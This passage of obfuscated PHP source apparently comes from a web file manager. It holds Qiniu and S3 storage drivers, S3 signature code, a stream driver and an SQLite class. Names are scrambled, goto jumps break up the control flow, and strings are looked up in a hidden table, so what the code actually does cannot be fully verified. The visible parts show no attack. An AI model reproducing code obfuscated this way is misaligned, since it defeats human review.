($F²§Å½Ùî¯) { $this->cacheMethod($câ•ØÄœÏ¼[197], $d’»¼ºÊÀƒ, !0); } goto a‹êã¼ªâ; D½ŸŒÁ½¶ã: $câ•ØÄœÏ¼ =& $_SERVER[ç]; $d’»¼ºÊÀƒ = trim($d’»¼ºÊÀƒ, $câ•ØÄœÏ¼[8]); $Eµ‰İÖá Ü = empty($d’»¼ºÊÀƒ) ? $câ•ØÄœÏ¼[33] : $d’»¼ºÊÀƒ . $câ•ØÄœÏ¼[8]; goto dÀÑ­æëˆ§; a‹êã¼ªâ: return array($câ•ØÄœÏ¼[74] => $B·”ğ»Ã¦, $câ•ØÄœÏ¼[73] => $EŠ¡ÒğÓñŞ); goto FæÖ‡ÜÎªÃ; FæÖ‡ÜÎªÃ: } public function canRead($A‡²àœãé‰) { return $this->exist($A‡²àœãé‰) ? !0 : !1; } public function canWrite($bµËÊ‹–¢Ù) { return $this->exist($bµËÊ‹–¢Ù) ? !0 : !1; } public function getContent($A‰¶áêÍ³ƒ) { return $this->fileSubstr($A‰¶áêÍ³ƒ, 0, -1); } public function setContent($e“ÙßËğİó, $AÁ‡¶òƒ¬á = '') { $c³Çğ÷Åé¦ = $this->tempFile($this->pathThis($e“ÙßËğİó)); file_put_contents($c³Çğ÷Åé¦, $AÁ‡¶òƒ¬á); if ($this->upload($e“ÙßËğİó, $c³Çğ÷Åé¦)) { $this->tempFileRemve($c³Çğ÷Åé¦); return !0; } return !1; } public function refreshUrls($a¢£µË®Æ) { goto d“²âÆ¥Ç¹; dŠ´šÄ†ãˆ: $aÇå²¸²ãŠ = new Qiniu\Cdn\CdnManager($this->auth); list($CàÆµåÙ‡À, $eÈªÑ©Ü”) = $aÇå²¸²ãŠ->refreshUrls($a‰Š¸Ç’ÚÁ); if ($eÈªÑ©Ü”) { return !1; } goto fëè„ŞÍ; fëè„ŞÍ: return $CàÆµåÙ‡À[$d‘›°ƒˆáô[1045]] == $d‘›°ƒˆáô[702] ? !0 : !1; goto dŠ‰¼¬È; d“²âÆ¥Ç¹: $d‘›°ƒˆáô =& $_SERVER[ç]; $a‰Š¸Ç’ÚÁ = array(); if (is_array($a¢£µË®Æ)) { foreach ($a¢£µË®Æ as $Eˆ© ùµ˜¨) { $a‰Š¸Ç’ÚÁ[] = $this->link($Eˆ© ùµ˜¨); } } else { $a‰Š¸Ç’ÚÁ[] = $this->link($a¢£µË®Æ); } goto dŠ´šÄ†ãˆ; dŠ‰¼¬È: } public function fileSubstr($EËéŸªì‡ê, $cÚâÆÈÆö´, $FŒ¾ÂßÎ×) { $DˆŒªŞ ¤ =& $_SERVER[ç]; if (!($B»»¾Æ×„Ë = $this->link($EËéŸªì‡ê))) { return !1; } $a‰ãå‚ùÈË = !1; if ($FŒ¾ÂßÎ× > 0) { $b³ïÌ®¹´ = $cÚâÆÈÆö´ + $FŒ¾ÂßÎ× - 1; $a‰ãå‚ùÈË = array($DˆŒªŞ ¤[1273] . $cÚâÆÈÆö´ . $DˆŒªŞ ¤[434] . $b³ïÌ®¹´); } $DÑ¿í¯ÍŸ§ = url_request($B»»¾Æ×„Ë, $DˆŒªŞ ¤[226], !1, $a‰ãå‚ùÈË); return $DÑ¿í¯ÍŸ§[$DˆŒªŞ ¤[695]] ? $DÑ¿í¯ÍŸ§[$DˆŒªŞ ¤[1055]] : !1; } public function upload($AÂ‹Ğá´ÒŞ, $B“³²“×, $böØ¡ºª†† = false, $f¯çßÜ¥Ãì = REPEAT_REPLACE) { $f‘‘©¸Ü±‰ = new Qiniu\Storage\UploadManager(); $C‘ªå‚çÑ = $this->auth->uploadToken($this->bucket, $AÂ‹Ğá´ÒŞ); $BßéÍœÁ“‚ = get_file_mime(get_path_ext($B“³²“×)); list($BÉ¡÷„³Ò, $E“ØŠ’ˆŞ¨) = $f‘‘©¸Ü±‰->putFile($C‘ªå‚çÑ, $AÂ‹Ğá´ÒŞ, $B“³²“×, null, $BßéÍœÁ“‚); return $E“ØŠ’ˆŞ¨ ? !1 : $this->getPathOuter($AÂ‹Ğá´ÒŞ); } public function uploadFormData($Eµ¿• àè×, $eÕÓÏõÎŸù = 3600) { return $this->uploadToken($Eµ¿• àè×, $eÕÓÏõÎŸù); } public function multiUploadFormData($BˆÁ®›§™, $DºË½Îñ = 3600) { return $this->uploadToken($BˆÁ®›§™, $DºË½Îñ); } private function uploadToken($e†Ùİ½êª›, $C«’Ú÷Õ©¶ = 3600) { goto d¡‡‚ÆÅ´; d¡‡‚ÆÅ´: $c¿©øÜòÛ‘ =& $_SERVER[ç]; $f•òÈŸ˜ ¨ = $C«’Ú÷Õ©¶; $Dù˜·Š§Ş = array($c¿©øÜòÛ‘[1274] => $c¿©øÜòÛ‘[1275]); goto C¨Ç„«Àæ; a”™Şó©¹: $d–œï£ØË¬ = http_type() . "\x3a\x2f\57\x75\160\154\x6f\x61\144{$BàÜó“Âë¢}\56\161\x69\156\x69\x75\160\56\x63\157\x6d\x2f"; return array($c¿©øÜòÛ‘[1277] => $e–±®‡×œÁ, $c¿©øÜòÛ‘[1278] => $d–œï£ØË¬); goto F†ğÒõµÚµ; C¨Ç„«Àæ: $DÓôŠïŠ” = $e†Ùİ½êª›; $e–±®‡×œÁ = $this->auth->uploadToken($this->bucket, $DÓôŠïŠ”, $f•òÈŸ˜ ¨, $Dù˜·Š§Ş, !0); $BàÜó“Âë¢ = empty($this->region) || $this->region == $c¿©øÜòÛ‘[1276] ? $c¿©øÜòÛ‘[33] : $c¿©øÜòÛ‘[434] . $this->region; goto a”™Şó©¹; F†ğÒõµÚµ: } public function download($A¯èòå², $Bò¦¹·ÈÊ) { goto bÁŞ½Ğ¤†; bÁŞ½Ğ¤†: $bä‡ŒÔí†ø = IO::getPathInner(IO::mkfile($Bò¦¹·ÈÊ)); if (!($BŞ±ÏÍê‘ = $this->link($A¯èòå²))) { return !1; } $EÖÚĞ‘ÜÂË = 0; goto AÒõ¾Èµ ‰; C”å­İáà§: fclose($Fæ™ÍÔñò÷); return $Bò¦¹·ÈÊ; goto A¡Œ‡ã‘Ê; AÒõ¾Èµ ‰: $e­ß‚­­Á = 1024 * 200; $Fæ™ÍÔñò÷ = fopen($bä‡ŒÔí†ø, $_SERVER[ç][1279]); while (!0) { $Dî”ºÚ¯™Á = $this->fileSubstr($A¯èòå², $EÖÚĞ‘ÜÂË, $e­ß‚­­Á); if ($Dî”ºÚ¯™Á === !1) { return !1; } fwrite($Fæ™ÍÔñò÷, $Dî”ºÚ¯™Á); $EÖÚĞ‘ÜÂË += $e­ß‚­­Á; if (strlen($Dî”ºÚ¯™Á) < $e­ß‚­­Á) { break; } } goto C”å­İáà§; A¡Œ‡ã‘Ê: } public function link($cñË‰—’», $f½÷ğ£åÎ‘ = '') { if (!$this->isFile($cñË‰—’»)) { return !1; } $FÉœ·ÓëÍõ = $this->getHost() . $_SERVER[ç][8] . $this->pathEncode($cñË‰—’») . $f½÷ğ£åÎ‘; return $this->auth->privateDownloadUrl($FÉœ·ÓëÍõ, 3600 * 12); } public function fileOut($CŞ¥ÕÒœÃê, $cã»‹Ãƒì‡ = false, $cÎÏ¡âËù¡ = false, $dĞ¹³ƒÆ‰¢ = '') { $EğØÜ¯³Ñ‘ =& $_SERVER[ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($CŞ¥ÕÒœÃê, $cã»‹Ãƒì‡, $cÎÏ¡âËù¡, $dĞ¹³ƒÆ‰¢); } if (!$cÎÏ¡âËù¡) { $cÎÏ¡âËù¡ = $this->pathThis($CŞ¥ÕÒœÃê); } $Fİ¿ë»ÙªÊ = $cã»‹Ãƒì‡ ? $EğØÜ¯³Ñ‘[1280] . rawurlencode($cÎÏ¡âËù¡) : $EğØÜ¯³Ñ‘[33]; $D˜ã¸£¢ª = $this->link($CŞ¥ÕÒœÃê, $Fİ¿ë»ÙªÊ); $this->fileOutLink($D˜ã¸£¢ª); } public function fileOutServer($d¾İ×½Œö—, $b­Ä´Ï‹‘ = false, $FùÁåÛƒÖÎ = false, $aù‡÷›£¥ = '') { parent::fileOut($d¾İ×½Œö—, $b­Ä´Ï‹‘, $FùÁåÛƒÖÎ, $aù‡÷›£¥); } public function fileOutImage($F‹ÓÈÔøˆ§, $Fµ¶æğ¤· = 250) { $DÌÈÁô£©Ú = $this->link($F‹ÓÈÔøˆ§, $_SERVER[ç][1281] . $Fµ¶æğ¤·); $this->fileOutLink($DÌÈÁô£©Ú); } public function fileOutImageServer($CÌÜƒœàƒó, $eÖÂÜïè²± = 250) { parent::fileOutImage($CÌÜƒœàƒó, $eÖÂÜïè²±); } public function hashMd5($dƒƒÛÛÂÙª) { $e½†Ê‰ï×º =& $_SERVER[ç]; $ešš¶Ş²¨ = $this->objectMeta($dƒƒÛÛÂÙª); return isset($ešš¶Ş²¨[$e½†Ê‰ï×º[206]]) ? $ešš¶Ş²¨[$e½†Ê‰ï×º[206]] : !1; $b‰¥„¿ù¾Ş = $this->link($dƒƒÛÛÂÙª, $e½†Ê‰ï×º[1282]); } public function size($EèÎÔòÈÜÄ) { $dË‡½ª«Ãñ = $this->objectMeta($EèÎÔòÈÜÄ); return $dË‡½ª«Ãñ ? $dË‡½ª«Ãñ[$_SERVER[ç][77]] : 0; } public function info($E¦Å¿åÀ¬à) { if ($this->isFolder($E¦Å¿åÀ¬à)) { return $this->folderInfo($E¦Å¿åÀ¬à); } else { if ($this->isFile($E¦Å¿åÀ¬à)) { return $this->fileInfo($E¦Å¿åÀ¬à); } } return !1; } public function exist($eîèßÒìÃ) { return $this->isFile($eîèßÒìÃ) || $this->isFolder($eîèßÒìÃ); } public function isFile($DÄÏ¶†ÙÊÔ) { return !$this->isFolder($DÄÏ¶†ÙÊÔ) && $this->objectMeta($DÄÏ¶†ÙÊÔ); } public function isFolder($bÆÒÙ¸ÙèÉ) { return $this->cacheMethod($_SERVER[ç][197], $bÆÒÙ¸ÙèÉ); } protected function objectMeta($Bğ¶İ©Ëù¢) { return $this->cacheMethod($_SERVER[ç][198], $Bğ¶İ©Ëù¢); } protected function _objectMeta($FÓ¤…ÂÜŠ) { $EëÈã¯ºé¤ =& $_SERVER[ç]; list($CšÃé‘İƒ®, $eÊ˜ÄİØÌ¡) = $this->bucketManager->stat($this->bucket, $FÓ¤…ÂÜŠ); if ($CšÃé‘İƒ®) { $CšÃé‘İƒ®[$EëÈã¯ºé¤[77]] = intval($CšÃé‘İƒ®[$EëÈã¯ºé¤[1268]]); } return $CšÃé‘İƒ®; } protected function _isFolder($fŠÓäÕƒ‡Ë) { $B±ìÓ ¾ñ =& $_SERVER[ç]; if ($fŠÓäÕƒ‡Ë == $B±ìÓ ¾ñ[33] || $fŠÓäÕƒ‡Ë == $B±ìÓ ¾ñ[8]) { return !0; } list($bĞæè¥±Ô£, $E¼Êšš»¸) = $this->bucketManager->listFiles($this->bucket, trim($fŠÓäÕƒ‡Ë, $B±ìÓ ¾ñ[8]) . $B±ìÓ ¾ñ[8], $B±ìÓ ¾ñ[33], 1, $B±ìÓ ¾ñ[8]); return !empty($bĞæè¥±Ô£[$B±ìÓ ¾ñ[1271]]) || !empty($bĞæè¥±Ô£[$B±ìÓ ¾ñ[1272]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Föõ¼õ¾ß) { parent::__construct($Föõ¼õ¾ß); } public function uploadFormData($cáÙùŞ“»†, $fá¿‰õìÅš = 3600) { goto F¤á‹ƒ‰ù°; d­åÔ¹ºÁÁ: $EèÇõ‰Î©à = array($cá§”ë×¬ø[209] => $cá§”ë×¬ø[33], $cá§”ë×¬ø[1200] => $cá§”ë×¬ø[33], $cá§”ë×¬ø[1158] => $Aíê¥±Ì¿Ó, $cá§”ë×¬ø[1162] => $Fíò­©¥ºß, $cá§”ë×¬ø[1166] => $F¡‰È³à…, $cá§”ë×¬ø[1201] => $eò Ç”ïÛ, $cá§”ë×¬ø[1202] => $DÆÊÍÕ®ßÜ, $cá§”ë×¬ø[1203] => $A«ÒÖ‹‚Šé, $cá§”ë×¬ø[1204] => $dÆĞ”Á¢óù, $cá§”ë×¬ø[1205] => $eˆî†¤Ç²Ş, $cá§”ë×¬ø[175] => $this->getHost()); return $EèÇõ‰Î©à; goto C‚ÏÜàÇ‰·; a­ŒÍØíŠ˜: $C‡ŞĞ“Û¥â = hash_hmac($cá§”ë×¬ø[1198], $fñœØ›Õ†·, $EØÎ™’Ò¾ñ, !0); $Dœ²ëì¥¥“ = hash_hmac($cá§”ë×¬ø[1198], $Bä‰ï£Èù, $C‡ŞĞ“Û¥â, !0); $eˆî†¤Ç²Ş = hash_hmac($cá§”ë×¬ø[1198], $F¡‰È³à…, $Dœ²ëì¥¥“); goto d­åÔ¹ºÁÁ; BÍ‚‰÷Ø•‡: $B¶Î©ËÓ = array($this->accessKey, $DÌ¬‚¥Ìæé, $this->region, $fñœØ›Õ†·, $Bä‰ï£Èù); $eò Ç”ïÛ = implode($cá§”ë×¬ø[8], $B¶Î©ËÓ); $cùê«áµÙŒ = array($cá§”ë×¬ø[1156] => gmdate($cá§”ë×¬ø[1155], strtotime($cá§”ë×¬ø[1191])), $cá§”ë×¬ø[1157] => array(array($cá§”ë×¬ø[1159] => $this->bucket), array($cá§”ë×¬ø[1158] => $Aíê¥±Ì¿Ó), array($cá§”ë×¬ø[1160], $cá§”ë×¬ø[1161], $cá§”ë×¬ø[33]), array($cá§”ë×¬ø[1160], $cá§”ë×¬ø[1192], $cá§”ë×¬ø[33]), array($cá§”ë×¬ø[1160], $cá§”ë×¬ø[1193], $cá§”ë×¬ø[33]), array($cá§”ë×¬ø[1162] => $Fíò­©¥ºß), array($cá§”ë×¬ø[1194] => $eò Ç”ïÛ), array($cá§”ë×¬ø[1195] => $DÆÊÍÕ®ßÜ), array($cá§”ë×¬ø[1196] => $A«ÒÖ‹‚Šé), array($cá§”ë×¬ø[1197] => $dÆĞ”Á¢óù))); goto BíìàÛŠ¨; BíìàÛŠ¨: $F¡‰È³à… = base64_encode(json_encode($cùê«áµÙŒ)); $b˜ô³İƒ = hash_hmac($cá§”ë×¬ø[1198], $DÌ¬‚¥Ìæé, $cá§”ë×¬ø[1199] . $this->secret, !0); $EØÎ™’Ò¾ñ = hash_hmac($cá§”ë×¬ø[1198], $this->region, $b˜ô³İƒ, !0); goto a­ŒÍØíŠ˜; câÔÖ³Ó‹ï: $Bä‰ï£Èù = $cá§”ë×¬ø[1190]; $dÆĞ”Á¢óù = $fá¿‰õìÅš . $cá§”ë×¬ø[33]; $Fíò­©¥ºß = $cá§”ë×¬ø[1154]; goto BÍ‚‰÷Ø•‡; Bäª°Á…ÄÈ: $fñœØ›Õ†· = $cá§”ë×¬ø[59]; $A«ÒÖ‹‚Šé = gmdate($cá§”ë×¬ø[1189]); $DÌ¬‚¥Ìæé = gmdate($cá§”ë×¬ø[696]); goto câÔÖ³Ó‹ï; F¤á‹ƒ‰ù°: $cá§”ë×¬ø =& $_SERVER[ç]; $Aíê¥±Ì¿Ó = $cá§”ë×¬ø[191]; $DÆÊÍÕ®ßÜ = $cá§”ë×¬ø[1188]; goto Bäª°Á…ÄÈ; C‚ÏÜàÇ‰·: } public function multiUploadFormData($EåÖ¢ˆ˜ğ, $B¤áîÏîõ = 3600) { $bƒÜ¯õôß¿ =& $_SERVER[ç]; $CÂ…ÕåÜ²À = gmdate($bƒÜ¯õôß¿[1283]); $CÇññ‰©Í¥ = array(); $dĞ‹ºÅÚä = $this->client->getUploadId($this->bucket, $EåÖ¢ˆ˜ğ, $CÇññ‰©Í¥); if (!$dĞ‹ºÅÚä) { return !1; } return array($bƒÜ¯õôß¿[219] => $dĞ‹ºÅÚä, $bƒÜ¯õôß¿[175] => $this->getHost() . $bƒÜ¯õôß¿[8] . $this->pathEncode($EåÖ¢ˆ˜ğ), $bƒÜ¯õôß¿[220] => $CÂ…ÕåÜ²À, $bƒÜ¯õôß¿[92] => $EåÖ¢ˆ˜ğ); } public function multiUploadAuthData($A‘èõ‘éÓ¬, $BÚ½ÖèÙË“ = array()) { goto eŠÈáõîÎ; cèğ³¥œ§: if (isset($BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[1284]])) { $eİÑ†‰ÇÔõ[$fæÜ˜©ÚÑŞ[1285]] = $BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[1284]]; } $dÖÑšğœĞ¨ = explode($fæÜ˜©ÚÑŞ[177], $this->getHost()); $FâŸ©õ¦ÀŠ = array($fæÜ˜©ÚÑŞ[1286] => $dÖÑšğœĞ¨[1], $fæÜ˜©ÚÑŞ[1287] => $fæÜ˜©ÚÑŞ[33], $fæÜ˜©ÚÑŞ[209] => $fæÜ˜©ÚÑŞ[118], $fæÜ˜©ÚÑŞ[1200] => $BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[77]]); goto bÄÆù¶…Û‡; bÄÆù¶…Û‡: $c‰ÄõÕ¨¶Ô = $fæÜ˜©ÚÑŞ[224]; $föù¡‹æ©İ = $fæÜ˜©ÚÑŞ[8] . $this->pathEncode($EØİƒÖ¯õ) . $BÏ‘ ¾­´Ù; $f÷Ü©½·›§ = $this->client->__getSignatureV4($eİÑ†‰ÇÔõ, $FâŸ©õ¦ÀŠ, $c‰ÄõÕ¨¶Ô, $föù¡‹æ©İ); goto eÖœ©†Ö‰¤; a»œ…ƒä¿Ö: unset($BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[92]]); if (isset($BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[221]])) { return $this->listUploadParts($EØİƒÖ¯õ, $BÚ½ÖèÙË“); } $eİÑ†‰ÇÔõ = array(); goto cèğ³¥œ§; eŠÈáõîÎ: $fæÜ˜©ÚÑŞ =& $_SERVER[ç]; $BÏ‘ ¾­´Ù = isset($BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[167]]) ? $BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[167]] : $fæÜ˜©ÚÑŞ[33]; $EØİƒÖ¯õ = $BÚ½ÖèÙË“[$fæÜ˜©ÚÑŞ[92]]; goto a»œ…ƒä¿Ö; eÖœ©†Ö‰¤: if (strpos($BÏ‘ ¾­´Ù, $fæÜ˜©ÚÑŞ[223]) === 0) { if (isset($eİÑ†‰ÇÔõ[$fæÜ˜©ÚÑŞ[1285]])) { $CÆø§‚–íè = $eİÑ†‰ÇÔõ[$fæÜ˜©ÚÑŞ[1285]]; } else { if (isset($f÷Ü©½·›§[$fæÜ˜©ÚÑŞ[1285]])) { $CÆø§‚–íè = $f÷Ü©½·›§[$fæÜ˜©ÚÑŞ[1285]]; } else { $CÆø§‚–íè = hash($fæÜ˜©ÚÑŞ[1198], $fæÜ˜©ÚÑŞ[33]); } } return array($fæÜ˜©ÚÑŞ[230] => $f÷Ü©½·›§[$fæÜ˜©ÚÑŞ[230]], $fæÜ˜©ÚÑŞ[1285] => $CÆø§‚–íè, $fæÜ˜©ÚÑŞ[220] => $f÷Ü©½·›§[$fæÜ˜©ÚÑŞ[1288]]); } return $f÷Ü©½·›§[$fæÜ˜©ÚÑŞ[230]]; goto fê£î‘æÙğ; fê£î‘æÙğ: } public function listUploadParts($FÉŞç„¢‘§, $Fˆé®‡ = array()) { goto c©·ùÄˆµ¥; f¯éŒĞ: if (!$dš¡Üê†) { return !1; } $AÇ×•ßÙÔ = $f°ºò¯×¬[1289]; foreach ($dš¡Üê† as $F»Ğô²æÃ) { $AÇ×•ßÙÔ .= $f°ºò¯×¬[1290] . "\x3c\x50\x61\162\164\116\165\155\142\x65\x72\x3e{$F»Ğô²æÃ[$f°ºò¯×¬[1245]]}\x3c\57\120\x61\x72\x74\x4e\165\x6d\142\145\x72\x3e\xa" . "\74\105\124\x61\x67\x3e{$F»Ğô²æÃ[$f°ºò¯×¬[1246]]}\74\x2f\105\x54\x61\147\x3e\xa" . $f°ºò¯×¬[1291]; } goto cïæì¹šËÒ; cïæì¹šËÒ: $AÇ×•ßÙÔ .= $f°ºò¯×¬[1292]; $a´÷¿·«Ô = array(); $F‹Ú‡šî = explode($f°ºò¯×¬[177], $this->getHost()); goto f…î²¬ÁÖ; f…î²¬ÁÖ: $Bœ¨‹Ã•Øî = array($f°ºò¯×¬[1286] => $F‹Ú‡šî[1], $f°ºò¯×¬[209] => $f°ºò¯×¬[118], $f°ºò¯×¬[1200] => strlen($AÇ×•ßÙÔ)); $aÆ†Û…Şš– = $f°ºò¯×¬[222]; $cÃê÷Æ¨‰ = $f°ºò¯×¬[8] . $this->pathEncode($FÉŞç„¢‘§) . $Fˆé®‡[$f°ºò¯×¬[167]]; goto eàÂâ™ØŞ; eàÂâ™ØŞ: $A«ŞÛµŒ„… = $this->client->__getSignatureV4($a´÷¿·«Ô, $Bœ¨‹Ã•Øî, $aÆ†Û…Şš–, $cÃê÷Æ¨‰, $AÇ×•ßÙÔ); return array($f°ºò¯×¬[230] => $A«ŞÛµŒ„…[$f°ºò¯×¬[230]], $f°ºò¯×¬[220] => $A«ŞÛµŒ„…[$f°ºò¯×¬[1288]], $f°ºò¯×¬[232] => $dš¡Üê†, $f°ºò¯×¬[1285] => $A«ŞÛµŒ„…[$f°ºò¯×¬[1285]]); goto aô•ÏŒ™ä‘; c©·ùÄˆµ¥: $f°ºò¯×¬ =& $_SERVER[ç]; $Eß£ù˜À¦© = str_replace($f°ºò¯×¬[231], $f°ºò¯×¬[33], $Fˆé®‡[$f°ºò¯×¬[167]]); $dš¡Üê† = $this->client->listParts($this->bucket, $FÉŞç„¢‘§, $Eß£ù˜À¦©); goto f¯éŒĞ; aô•ÏŒ™ä‘: } public function link($f²‘ƒÔïÂ†, $e³•ÓÃÏè¥ = array()) { return parent::link($f²‘ƒÔïÂ†, $e³•ÓÃÏè¥); } public function fileOut($aæÌøÅ³Ò, $fäÑ›¦º¹œ = false, $f½ÖƒÛ—ñ¿ = false, $A«ëÂ¤¹ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ç][1293])) { return parent::fileOutServer($aæÌøÅ³Ò, $fäÑ›¦º¹œ, $f½ÖƒÛ—ñ¿, $A«ëÂ¤¹); } parent::fileOut($aæÌøÅ³Ò, $fäÑ›¦º¹œ, $f½ÖƒÛ—ñ¿, $A«ëÂ¤¹); } public function fileOutImage($b†Š†…¯óÜ, $DÁçêÑÙñŒ = 250) { if (strstr($this->endpoint, $_SERVER[ç][1293])) { return parent::fileOutImageServer($b†Š†…¯óÜ, $DÁçêÑÙñŒ); } parent::fileOutImage($b†Š†…¯óÜ, $DÁçêÑÙñŒ); } public function fileOutLink($BÅ™ˆÑ¥…·) { $e‘©Í‡²È =& $_SERVER[ç]; if (substr($BÅ™ˆÑ¥…·, 0, 7) == $e‘©Í‡²È[1169]) { $BÅ™ˆÑ¥…· = $e‘©Í‡²È[1170] . substr($BÅ™ˆÑ¥…·, 7); } header($e‘©Í‡²È[158] . $BÅ™ˆÑ¥…·); die; } public function getHost() { $F‰š°‡‘¢Î =& $_SERVER[ç]; $AŒÂâò®Ë = str_rtrim(parent::getHost(), $F‰š°‡‘¢Î[8] . $this->bucket); $AŒÂâò®Ë = explode($F‰š°‡‘¢Î[177], $AŒÂâò®Ë); return $AŒÂâò®Ë[0] . $F‰š°‡‘¢Î[177] . $this->bucket . $F‰š°‡‘¢Î[94] . $AŒÂâò®Ë[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($a×Úã†¹¦», $DğÃµË‘Ù = 0) { parent::__construct(); $this->source = $a×Úã†¹¦»; $this->sourceSize = $DğÃµË‘Ù; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($c’ƒÖ¶æÊµ = false) { return $this->sourceSize; } public function getContent($a‰¸Û›îÎ® = false) { return $this->fileSubstr($a‰¸Û›îÎ®, 0, $this->sourceSize); } public function fileSubstr($Eº•æö“¶Æ = false, $b¥²Ä±İ­‹ = 0, $e÷†ˆº…æ• = 0) { if (!$e÷†ˆº…æ•) { $e÷†ˆº…æ• = $this->sourceSize; } $dÃ„„†Ñã = $this->sourceSize - $b¥²Ä±İ­‹; if ($e÷†ˆº…æ• >= $dÃ„„†Ñã) { $e÷†ˆº…æ• = $dÃ„„†Ñã; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $b¥²Ä±İ­‹, $e÷†ˆº…æ•); } if ($this->sourceType == self::TYPE_FILE) { if ($e÷†ˆº…æ• <= 0) { return $_SERVER[ç][33]; } $dç˜Š®†ùŸ = ftell($this->source); fseek_64($this->source, $dç˜Š®†ùŸ + $b¥²Ä±İ­‹); $cªµ¥¶Ø‡– = @fread($this->source, $e÷†ˆº…æ•); fseek_64($this->source, $dç˜Š®†ùŸ); return $cªµ¥¶Ø‡–; } } public function hashMd5($F´Öø…¶­ç = false) { return md5($this->getContent()); } public static function hash($DÕ—½äÓÑ§, $b‚¼¾ù«ÑÀ = 0) { $DË‘¶Ï’ïì = new PathDriverStream($DÕ—½äÓÑ§, $b‚¼¾ù«ÑÀ); return $DË‘¶Ï’ïì->hashSimple($DÕ—½äÓÑ§); } public static function md5($dÓ“¦˜…¸½, $AÅÌÂ¸´¸© = 0) { $aäİä‡øŒÕ = new PathDriverStream($dÓ“¦˜…¸½, $AÅÌÂ¸´¸©); return $aäİä‡øŒÕ->hashMd5($dÓ“¦˜…¸½); } } goto Bëñ¿ÛÙ—ª; c„ …îáÁÁ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BÃØ³©Ö‡ ; b…©‹¶©ä»: $this->in =& $in; $this->values[$DñÑÄêÆˆ©[6]] =& $config; $this->values[$DñÑÄêÆˆ©[7]] =& $in; goto a™ªå­Â÷İ; BÃØ³©Ö‡ : $DñÑÄêÆˆ© =& $_SERVER[ç]; global $in, $config; $this->config =& $config; goto b…©‹¶©ä»; a™ªå­Â÷İ: $this->tpl = TEMPLATE . MOD . $DñÑÄêÆˆ©[8]; $this->_classObjectID = mt_rand(0, 10000); goto CÉœ÷Œë„ò; CÉœ÷Œë„ò: } public function loadClass($cï¯†˜ÔˆÅ) { if (1 === func_num_args()) { $this->{$cï¯†˜ÔˆÅ} = new $cï¯†˜ÔˆÅ(); } else { $a‡¹¼‚µ­ß = new ReflectionClass($cï¯†˜ÔˆÅ); $cŒ ÌĞˆ…’ = func_get_args(); array_shift($cŒ ÌĞˆ…’); $this->{$cï¯†˜ÔˆÅ} = $a‡¹¼‚µ­ß->newInstanceArgs($cŒ ÌĞˆ…’); } return $this->{$cï¯†˜ÔˆÅ}; } protected function assign($E’ªºëÏ¾ï, $D¦È¸®ù†É) { $this->values[$E’ªºëÏ¾ï] = $D¦È¸®ù†É; } protected function display($e…­ìÂ™Ñ) { ob_end_clean(); extract($this->values); require $this->tpl . $e…­ìÂ™Ñ; } } class DbSqliteBase extends Db { public function __construct($eç¤¾—µÙÙ = '') { $a§÷İ»ãË¯ =& $_SERVER[ç]; if (!extension_loaded($a§÷İ»ãË¯[9])) { think_exception(think_lang($a§÷İ»ãË¯[10]) . $a§÷İ»ãË¯[11]); } if (!empty($eç¤¾—µÙÙ)) { if (!isset($eç¤¾—µÙÙ[$a§÷İ»ãË¯[12]])) { $eç¤¾—µÙÙ[$a§÷İ»ãË¯[12]] = 438; } $this->config = $eç¤¾—µÙÙ; if (empty($this->config[$a§÷İ»ãË¯[13]])) { $this->config[$a§÷İ»ãË¯[13]] = array(); } } } public function connect($c‹»âøäôŸ = '', $DÔÑ†¼ğ¿× = 0) { $CŸĞíŠ´ß =& $_SERVER[ç]; if (!isset($this->linkID[$DÔÑ†¼ğ¿×])) { goto d²áÒ®’ŞÇ; Aì–²§§ô²: @sqlite_busy_timeout($this->linkID[$DÔÑ†¼ğ¿×], 30000); if (1 != think_config($CŸĞíŠ´ß[18])) { unset($this->config); } goto A¨‹ƒºŞÜ; B¸Û²ˆš•º: $this->linkID[$DÔÑ†¼ğ¿×] = $féä²äÜ©($c‹»âøäôŸ[$CŸĞíŠ´ß[17]], $c‹»âøäôŸ[$CŸĞíŠ´ß[12]]); if (!$this->linkID[$DÔÑ†¼ğ¿×]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Aì–²§§ô²; d²áÒ®’ŞÇ: if (empty($c‹»âøäôŸ)) { $c‹»âøäôŸ = $this->config; } $b´¶·Şµ¼ = !empty($c‹»âøäôŸ[$CŸĞíŠ´ß[13]][$CŸĞíŠ´ß[14]]) ? $c‹»âøäôŸ[$CŸĞíŠ´ß[13]][$CŸĞíŠ´ß[14]] : $this->pconnect; $féä²äÜ© = $b´¶·Şµ¼ ? $CŸĞíŠ´ß[15] : $CŸĞíŠ´ß[16]; goto B¸Û²ˆš•º; A¨‹ƒºŞÜ: } return $this->linkID[$DÔÑ†¼ğ¿×]; } public function free() { $this->queryID = null; } public function query($E±Ì©½) { goto aµªŞ›Ô¯ê; cëíŞù¹İ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BâİÒ÷œÅ = $this->getAll(); return $BâİÒ÷œÅ; } goto b™ç‰–ò‘à; dİÆ‹êÆŠ: $this->queryStr = $E±Ì©½; if ($this->queryID) { $this->free(); } think_action_status($eÙ©‰À‘Ğ§[19], 1); goto a§Ş“…ª£Š; aµªŞ›Ô¯ê: $eÙ©‰À‘Ğ§ =& $_SERVER[ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dİÆ‹êÆŠ; a§Ş“…ª£Š: think_status($eÙ©‰À‘Ğ§[20]); $this->queryID = sqlite_query($this->_linkID, $E±Ì©½); $this->debug(); goto cëíŞù¹İ; b™ç‰–ò‘à: } public function 